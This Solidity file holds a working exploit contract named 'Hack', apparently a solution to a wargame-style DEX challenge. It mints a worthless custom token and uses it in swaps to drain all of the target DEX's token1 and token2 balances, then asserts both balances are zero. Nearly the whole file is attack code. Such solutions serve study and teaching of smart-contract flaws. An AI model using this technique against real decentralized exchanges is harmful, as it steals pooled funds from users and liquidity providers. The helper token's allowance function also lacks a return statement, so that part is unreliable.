// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor(IDex idex) {
        IERC20 token1 = IERC20(idex.token1());
        IERC20 token2 = IERC20(idex.token2());
        MyToken myToken = new MyToken();

        myToken.mint(4);
        myToken.transfer(address(idex), 1);
        myToken.approve(address(idex), 3);
        idex.swap(address(myToken), address(token1), 1);
        idex.swap(address(myToken), address(token2), 2);

        require(token1.balanceOf(address(idex)) == 0, "idex token1 != 0");
        require(token2.balanceOf(address(idex)) == 0, "idex token2 != 0");
    }
}

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

//基于IERC20的简单实现
contract MyToken is IERC20 {
    uint256 public s_totalSupply;
    mapping(address => uint256) public s_balanceOf;
    mapping(address => mapping(address => uint256)) public s_allowance;

    function transfer(address to, uint256 value) external returns (bool) {
        s_balanceOf[msg.sender] -= value;
        s_balanceOf[to] += value;
        // emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        s_allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        s_allowance[from][msg.sender] -= value;
        s_balanceOf[from] -= value;
        s_balanceOf[to] += value;
        return true;
    }

    function mint(uint256 amount) external {
        s_balanceOf[msg.sender] += amount;
        s_totalSupply += amount;
    }

    function burn(uint256 amount) external {
        s_balanceOf[msg.sender] -= amount;
        s_totalSupply -= amount;
    }

    function totalSupply() external view override returns (uint256) {
        return s_totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return s_balanceOf[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        s_allowance[owner][spender];
    }
}
